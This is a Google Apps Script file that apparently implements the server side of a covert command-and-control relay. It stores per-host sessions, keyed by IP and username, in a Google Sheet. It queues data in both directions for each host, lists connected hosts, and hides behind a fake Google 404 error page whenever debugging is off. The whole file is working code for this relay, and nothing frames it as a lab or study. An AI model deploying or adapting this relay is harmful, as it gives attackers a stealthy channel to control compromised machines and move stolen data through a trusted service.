// URL to spreadsheet in google drive to store data
SPREADSHEET_URL = '';
SPREADSHEET = SpreadsheetApp.openByUrl(SPREADSHEET_URL);
SHEET = SPREADSHEET.getSheets()[0];
DEBUG = true;

function err(error) {
  // return google-like error page if not debugging
  if (!DEBUG) {
    var msg = '<!DOCTYPE html><html lang=en><meta charset=utf-8><meta name=viewport content="initial-scale=1, minimum-scale=1, width=device-width"><title>Error 404 (Not Found)!</title><style>*{margin:0;padding:0}html,code{font:15px/22px arial,sans-serif}html{background:#fff;color:#222;padding:15px}body{margin:7% auto 0;max-width:390px;min-height:180px;padding:30px 0 15px}* > body{background:url(//www.google.com/images/errors/robot.png) 100% 5px no-repeat;padding-right:205px}p{margin:11px 0 22px;overflow:hidden}ins{color:#777;text-decoration:none}a img{border:0}@media screen and (max-width:772px){body{background:none;margin-top:0;max-width:none;padding-right:0}}#logo{background:url(//www.google.com/images/branding/googlelogo/1x/googlelogo_color_150x54dp.png) no-repeat;margin-left:-5px}@media only screen and (min-resolution:192dpi){#logo{background:url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) no-repeat 0% 0%/100% 100%;-moz-border-image:url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) 0}}@media only screen and (-webkit-min-device-pixel-ratio:2){#logo{background:url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) no-repeat;-webkit-background-size:100% 100%}}#logo{display:inline-block;height:54px;width:150px}</style><span id=logo aria-label=Google></span><p><b>404.</b> <ins>That’s an error.</ins><p>The requested URL was not found on this server.<ins>That’s all we know.</ins>';
    return HtmlService.createHtmlOutput(msg);
  }
  return ContentService.createTextOutput(error);
}

function get_cell(ip, user, col, skip) {
  var data = SHEET.getDataRange().getValues();
  for (var row = 0; row < data.length; row++) {
    if ((data[row][0] === ip) && (data[row][1] === user)) {
      if (skip) {
        return (data[row + 1][col] != undefined ? data[row + 1][col] : '');
      }
      return (data[row][col] != undefined ? data[row][col] : '');
    }
  }
  return -1;
}

function set_cell(ip, user, col, val, skip) {
  var data = SHEET.getDataRange().getValues();
  for (var row = 0; row < data.length; row++) {
    if ((data[row][0] === ip) && (data[row][1] === user)) {
      if (skip) {
        SHEET.getRange(row + 2, col + 1).setValue(val);
      } else {
        SHEET.getRange(row + 1, col + 1).setValue(val);
      }
      break;
    }
  }
}

function doPost(e) {
  try {
    for (var p in e.parameter) {
      switch (p) {
        case 'Tx':
          var session = Utilities.newBlob(Utilities.base64Decode(e.parameter[p])).getDataAsString().split('|');
          set_cell(session[0], session[1], parseInt(session[2]), decodeURIComponent(e.postData.contents.slice(2)), false);
          return ContentService.createTextOutput('ok');
        case 'Rx':
          var session = Utilities.newBlob(Utilities.base64Decode(e.parameter[p])).getDataAsString().split('|');
          set_cell(session[0], session[1], parseInt(session[2]), decodeURIComponent(e.postData.contents.slice(2)), true);
          return ContentService.createTextOutput('ok');
      }
    }
    return err('unknown command: ' + p);
  } catch (error) {
    return err(error);
  }
}

function doGet(e) {
  try {
    for (var p in e.parameter) {
      switch (p) {
        case 'TxR':
          var session = Utilities.newBlob(Utilities.base64Decode(e.parameter[p])).getDataAsString().split('|');
          var r = get_cell(session[0], session[1], 2, false);
          // new session checking in
          if (r == -1) {
            SHEET.appendRow([session[0], session[1], '0']); // Tx
            SHEET.appendRow([session[0], session[1], '0']); // Rx
            return ContentService.createTextOutput('0');
          }
          return ContentService.createTextOutput(r);
        case 'RxR':
          var session = Utilities.newBlob(Utilities.base64Decode(e.parameter[p])).getDataAsString().split('|');
          return ContentService.createTextOutput(get_cell(session[0], session[1], 2, true));
        case 'TxD':
          var session = Utilities.newBlob(Utilities.base64Decode(e.parameter[p])).getDataAsString().split('|');
          var d = get_cell(session[0], session[1], parseInt(session[2]), false);
          set_cell(session[0], session[1], parseInt(session[2]), '', false);
          return ContentService.createTextOutput(d);
        case 'RxD':
          var session = Utilities.newBlob(Utilities.base64Decode(e.parameter[p])).getDataAsString().split('|');
          var d = get_cell(session[0], session[1], parseInt(session[2]), true);
          set_cell(session[0], session[1], parseInt(session[2]), '', true);
          return ContentService.createTextOutput(d);
        case 'ls':
          var res = [];
          var data = SHEET.getDataRange().getValues();
          for (var row = 0; row < data.length; row+=2) {
            res.push(data[row][0]);
            res.push(data[row][1]);
          }
          return ContentService.createTextOutput(res.join('|'));
      }
    }
    return err('unknown command: ' + p);
  } catch (error) {
    return err(error);
  }
}
